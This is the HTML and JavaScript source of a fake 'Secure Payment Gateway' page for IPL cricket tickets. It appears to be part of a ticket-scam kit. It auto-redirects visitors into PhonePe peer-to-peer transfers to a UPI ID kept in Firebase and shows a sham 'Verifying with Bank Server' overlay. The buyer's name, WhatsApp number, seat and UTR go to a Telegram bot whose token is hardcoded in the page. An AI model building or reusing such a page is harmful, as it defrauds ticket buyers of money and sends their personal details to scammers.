<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Payment Gateway</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap');
        body { font-family: 'Inter', sans-serif; background: #f0f4f8; margin: 0; padding: 15px; text-align: center; color: #1e293b; }
        
        .checkout-card { background: #fff; max-width: 400px; margin: auto; border-radius: 28px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
        
        /* Header Section */
        .header { background: linear-gradient(135deg, #0052FF 0%, #0036b3 100%); color: #fff; padding: 25px; position: relative; }
        .amount-tag { font-size: 36px; font-weight: 800; display: block; margin-top: 5px; letter-spacing: -1px; }
        
        .timer-box { background: #fffbeb; color: #b45309; padding: 12px; font-size: 13px; font-weight: 700; border-bottom: 1px solid #fde68a; display: flex; justify-content: center; align-items: center; gap: 8px; }
        
        /* QR Section */
        .qr-container { padding: 25px; background: #fafafa; }
        .qr-frame { background: #fff; padding: 12px; border-radius: 20px; border: 2px solid #edf2f7; display: inline-block; box-shadow: 0 10px 25px rgba(0,0,0,0.05); margin-bottom: 15px; }
        #qr-img { width: 200px; height: 200px; display: block; border-radius: 12px; }

        .upi-display { margin: 10px 20px; padding: 12px 15px; background: #fff; border: 1px dashed #cbd5e1; border-radius: 14px; display: flex; justify-content: space-between; align-items: center; }
        .upi-display strong { font-size: 14px; color: #475569; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; max-width: 180px; }
        .copy-btn { background: #eff6ff; color: #0052FF; border: 1px solid #bfdbfe; padding: 7px 14px; border-radius: 8px; cursor: pointer; font-weight: 700; font-size: 11px; transition: 0.2s; }

        .app-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 0 25px; margin-top: 15px; }
        .app-btn { display: flex; flex-direction: column; align-items: center; justify-content: center; background: #fff; border: 1px solid #e2e8f0; padding: 12px; border-radius: 18px; text-decoration: none; transition: 0.3s; box-shadow: 0 4px 6px rgba(0,0,0,0.02); }
        .app-btn img { height: 35px; width: 35px; object-fit: contain; margin-bottom: 6px; }
        .app-btn span { font-size: 12px; font-weight: 700; color: #334155; }

        /* 🔥 UTR FORM SECTION 🔥 */
        .utr-section { padding: 25px; border-top: 1px solid #f1f5f9; text-align: left; }
        .utr-title { font-size: 14px; font-weight: 700; color: #0f172a; margin-bottom: 15px; display: flex; align-items: center; gap: 8px; }
        .utr-input { width: 100%; padding: 14px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; font-weight: 700; letter-spacing: 1px; margin-bottom: 15px; }
        .utr-input:focus { border-color: #00cf7f; background: #f0fdf4; }

        .btn-confirm { width: 100%; padding: 18px; background: #111827; color: #fff; border: none; border-radius: 15px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.1); }
        .btn-confirm:disabled { background: #94a3b8; cursor: not-allowed; transform: none; box-shadow: none; }
        .btn-confirm:not(:disabled):hover { background: #00cf7f; transform: translateY(-2px); }

        .loading-text { font-size: 12px; color: #ef4444; font-weight: 600; margin-bottom: 10px; height: 18px; }
        #status-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.95); z-index: 10000; display: none; flex-direction: column; align-items: center; justify-content: center; }
    </style>
</head>
<body>

    <div id="status-overlay">
        <div style="width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #0052FF; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        <p style="margin-top: 15px; font-weight: 700;">Verifying with Bank Server...</p>
    </div>

    <div class="checkout-card">
        <div class="timer-box">
            <span id="redirect-icon">⏳</span> 
            Redirecting to PhonePe in <span id="timer">5</span>s...
        </div>
        
        <div class="header">
            <span style="font-size: 13px; opacity: 0.8; font-weight: 600; letter-spacing: 0.5px;">SECURE CHECKOUT</span>
            <span class="amount-tag" id="display-amount">₹0</span>
        </div>

        <div class="qr-container">
            <div class="loading-text" id="status-text">Connecting to bank...</div>
            <div class="qr-frame"><img id="qr-img" src="" alt="Payment QR"></div>

            <div class="upi-display">
                <strong id="display-upi">Loading...</strong>
                <button class="copy-btn" onclick="copyUPI()" id="copy-btn-text">COPY</button>
            </div>

            <div class="app-grid">
                <a href="#" id="phonepe-direct" class="app-btn">
                    <img src="https://cdn.razorpay.com/app/phonepe.svg" alt="PhonePe">
                    <span>PhonePe</span>
                </a>
                <a href="#" id="paytm-direct" class="app-btn">
                    <img src="https://cdn.razorpay.com/app/paytm.svg" alt="Paytm">
                    <span>Paytm</span>
                </a>
            </div>
        </div>

        <div class="utr-section">
            <div class="utr-title">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#00cf7f" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                Step 2: Enter Payment Details
            </div>
            
            <input type="number" id="utr-number" class="utr-input" placeholder="Enter 12 Digit UTR Number" oninput="checkUTR()">
            
            <button id="submit-confirm" class="btn-confirm" disabled onclick="finalSubmit()">
                CONFIRM BOOKING
            </button>
            <p style="font-size: 11px; color: #94a3b8; margin-top: 12px; text-align: center; font-weight: 500;">Fake UTR attempts lead to permanent IP block.</p>
        </div>
    </div>

    <script type="module">
        import { db, ref, onValue } from "./firebase.js";

        const finalPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice') || 0;
        const productName = localStorage.getItem('selectedSeatType') || "IPL Ticket";
        document.getElementById('display-amount').innerText = "₹" + finalPrice;

        onValue(ref(db, 'settings/payment'), (snap) => {
            if (snap.exists()) {
                const data = snap.val();
                const upiId = data.upiId || "paytm.s1h6t6g@pty";
                document.getElementById('display-upi').innerText = upiId;
                document.getElementById('status-text').innerText = "✅ Ready for payment";

                const note = encodeURIComponent("Pay for " + productName);
                const baseLink = `upi://pay?pa=${upiId}&pn=Booking&am=${finalPrice}&cu=INR&tn=${note}`;
                document.getElementById('qr-img').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(baseLink)}`;

                // PhonePe & Paytm Links
                const ppPayload = { contact: { vpa: upiId, type: "VPA" }, p2pPaymentCheckoutParams: { note: "Booking", initialAmount: finalPrice * 100, currency: "INR" }};
                const ppUrl = "phonepe://native?data=" + encodeURIComponent(btoa(JSON.stringify(ppPayload))) + "&id=p2ppayment";
                document.getElementById('phonepe-direct').href = ppUrl;
                document.getElementById('paytm-direct').href = `paytmmp://cash_wallet?pa=${upiId}&pn=Booking&am=${finalPrice}&cu=INR&tn=${note}&featuretype=money_transfer`;

                startAutoRedirect(ppUrl);
            }
        });

        // UTR Validation
        window.checkUTR = () => {
            const utr = document.getElementById('utr-number').value;
            const btn = document.getElementById('submit-confirm');
            btn.disabled = utr.length !== 12;
        };

        // Final Submission to Telegram
        window.finalSubmit = async () => {
            const utr = document.getElementById('utr-number').value;
            const overlay = document.getElementById('status-overlay');
            overlay.style.display = 'flex';

            const name = localStorage.getItem('customerName') || "N/A";
            const phone = localStorage.getItem('customerPhone') || "N/A";
            const match = localStorage.getItem('selectedMatchTitle') || "Match";

            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
            const chatId = "6820660513"; 
            
            const msg = `💰 *PAYMENT CONFIRMED!* 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${match}\n🎟️ Seat: ${productName}\n💵 Amount: ₹${finalPrice}\n🏦 *UTR: ${utr}*`;

            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                setTimeout(() => { window.location.href = "processing.html"; }, 2000);
            } catch (e) {
                alert("Server error! Please try again.");
                overlay.style.display = 'none';
            }
        };

        // Timer Logic
        let redirectStarted = false;
        function startAutoRedirect(url) {
            if(redirectStarted || finalPrice == 0) return;
            redirectStarted = true;
            let count = 5;
            const countdown = setInterval(() => {
                count--;
                document.getElementById('timer').innerText = count;
                if(count <= 0) {
                    clearInterval(countdown);
                    document.getElementById('redirect-icon').innerText = "🚀";
                    window.location.href = url;
                }
            }, 1000);
        }
    </script>

    <script>
        function copyUPI() {
            const upi = document.getElementById('display-upi').innerText;
            navigator.clipboard.writeText(upi).then(() => {
                const btn = document.getElementById('copy-btn-text');
                btn.innerText = "COPIED!";
                setTimeout(() => btn.innerText = "COPY", 2000);
            });
        }
    </script>
    <style> @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } } </style>
</body>
</html>
